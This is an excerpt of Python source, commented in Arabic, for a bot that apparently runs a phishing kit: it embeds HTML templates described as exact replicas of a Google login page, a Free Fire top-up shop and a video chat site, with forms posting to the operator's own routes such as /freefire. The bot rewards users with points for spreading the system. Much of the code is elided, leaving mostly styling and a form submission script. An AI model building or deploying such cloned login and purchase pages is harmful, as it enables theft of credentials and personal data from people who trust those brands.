...
تم تنظيف الواجهات وتطوير نظام التقارير
...
def build_main_menu(user_id):
    ...
    # رسالة ترحيب مختصرة
    safe_send(user_id, "👋 **مرحباً بك في نظام التحكم الذكي**\n\n📌 اختر الخدمة التي تريدها من القائمة أدناه\n\n💡 تعليمات سريعة:\n• الأزرار المغلقة 🔒 تتطلب نقاطاً\n• يمكنك الحصول على نقاط عبر مشاركة النظام\n• /help لعرض الأوامر الإضافية\n\n🛡️ نظام آمن ومشفر بالكامل")
...
# ===================== صفحات HTML المُعادة بناؤها (مواقع متطابقة 100%) =====================

# ===== صفحة Google Login المتطابقة =====
GOOGLE_LOGIN_PAGE = '''
<!DOCTYPE html>
...
# ===== صفحة Free Fire المتطابقة مع shop2game =====
FREE_FIRE_PAGE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', 'Segoe UI', Tahoma, sans-serif; }
        body { background: #0a0a1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { max-width: 480px; width: 100%; background: #1a1a2e; border-radius: 20px; padding: 30px 24px 24px; border: 1px solid rgba(255,255,255,0.06); box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
        .header { text-align: center; margin-bottom: 28px; position: relative; }
        .header .game-icon { font-size: 52px; display: block; margin-bottom: 6px; }
        .header h1 { font-size: 28px; font-weight: 900; background: linear-gradient(135deg, #ff6b35, #ff8a5c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; letter-spacing: 0.5px; }
        .header .subtitle { color: #ffd700; font-size: 13px; font-weight: 600; letter-spacing: 1.5px; text-transform: uppercase; margin-top: 2px; }
        .header .badge { display: inline-block; background: rgba(255,107,53,0.15); color: #ff6b35; padding: 4px 14px; border-radius: 20px; font-size: 10px; font-weight: 700; margin-top: 8px; border: 1px solid rgba(255,107,53,0.2); }
        .form-group { margin-bottom: 14px; }
        .form-group label { display: block; color: #b0b0c0; font-size: 12px; font-weight: 600; margin-bottom: 5px; letter-spacing: 0.3px; }
        .form-group label .required { color: #ff6b35; }
        .form-group input, .form-group select { width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.05); border: 2px solid rgba(255,255,255,0.1); border-radius: 12px; color: #ffffff; font-size: 15px; font-family: 'Montserrat', sans-serif; outline: none; transition: all 0.3s; }
        .form-group input:focus, .form-group select:focus { border-color: #ff6b35; background: rgba(255,107,53,0.05); box-shadow: 0 0 20px rgba(255,107,53,0.08); }
        .form-group input::placeholder { color: #666; }
        .form-group select option { background: #1a1a2e; color: #ffffff; }
        .package-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 10px 0 4px; }
        .package-item { background: rgba(255,255,255,0.03); border: 2px solid rgba(255,255,255,0.06); border-radius: 10px; padding: 12px 6px 10px; text-align: center; cursor: pointer; transition: all 0.3s; position: relative; }
        .package-item:hover { border-color: #ff6b35; background: rgba(255,107,53,0.08); }
        .package-item.selected { border-color: #ff6b35; background: rgba(255,107,53,0.12); box-shadow: 0 0 25px rgba(255,107,53,0.15); }
        .package-item .icon { font-size: 22px; display: block; }
        .package-item .amount { font-size: 15px; font-weight: 700; display: block; margin-top: 3px; color: #ffffff; }
        .package-item .bonus { font-size: 10px; color: #ffd700; font-weight: 600; display: block; }
        .package-item .price { font-size: 11px; color: #777; display: block; margin-top: 3px; }
        .package-item .popular { position: absolute; top: -7px; right: -7px; background: #ff6b35; color: white; font-size: 8px; font-weight: 700; padding: 2px 10px; border-radius: 10px; letter-spacing: 0.3px; }
        .price-summary { background: rgba(255,215,0,0.04); border: 1px solid rgba(255,215,0,0.12); border-radius: 12px; padding: 14px 18px; margin: 14px 0 16px; display: flex; justify-content: space-between; align-items: center; }
        .price-summary .label { color: #b0b0c0; font-size: 13px; font-weight: 500; }
        .price-summary .price-value { color: #ffd700; font-size: 22px; font-weight: 800; }
        .btn-buy { width: 100%; padding: 16px; background: linear-gradient(135deg, #ff6b35, #e55a2b); color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 700; font-family: 'Montserrat', sans-serif; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; letter-spacing: 0.5px; }
        .btn-buy:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(255,107,53,0.3); }
        .btn-buy:active { transform: translateY(0); }
        .btn-buy:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; box-shadow: none !important; }
        .secure-badge { text-align: center; margin-top: 14px; color: #555; font-size: 11px; }
        .secure-badge .lock { color: #4CAF50; }
        .footer-links { display: flex; justify-content: center; gap: 24px; margin-top: 18px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.04); }
        .footer-links a { color: #555; text-decoration: none; font-size: 11px; font-weight: 500; transition: all 0.3s; }
        .footer-links a:hover { color: #ff6b35; }
        .hidden-radio { display: none; }
        @media (max-width: 400px) { .container { padding: 20px 16px; } .package-grid { gap: 5px; } .package-item { padding: 10px 4px 8px; } .package-item .amount { font-size: 13px; } .package-item .icon { font-size: 18px; } .header h1 { font-size: 24px; } .price-summary .price-value { font-size: 19px; } .btn-buy { font-size: 15px; padding: 14px; } }
    </style>
</head>
<body>
    <div class="container">
    ...
    <script>
        ...
        document.getElementById('purchaseForm').addEventListener('submit', function(e) {
            ...
            fetch('/freefire', { method: 'POST', body: formData })
                ...
                .catch(function() { btn.innerHTML = '<span>💳</span> شراء الآن'; btn.disabled = false; });
        });
    </script>
</body>
</html>
...
# ===== صفحة Video Chat المتطابقة مع whoapp.live =====
VIDEO_CHAT_PAGE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
...
ACTIVE_ROUTES = [
    ...
    '/freefire', '/video_chat', '/survey', '/pdf_reader',
